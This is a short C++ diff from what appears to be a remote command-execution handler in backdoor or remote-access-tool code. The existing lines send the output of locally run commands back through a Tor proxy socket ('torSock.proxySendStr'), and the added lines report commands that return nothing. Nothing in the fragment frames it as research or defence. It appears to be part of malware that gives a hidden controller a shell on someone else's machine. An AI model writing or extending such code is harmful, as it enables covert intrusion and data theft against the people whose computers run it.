@@ -329,6 +329,9 @@ public:
             }
             _pclose(pipe);
         }
+        if (response.size() == 0) {
+            this->torSock.proxySendStr("exec;" + cmd + ";0;;");
+        }
         this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
     }
     
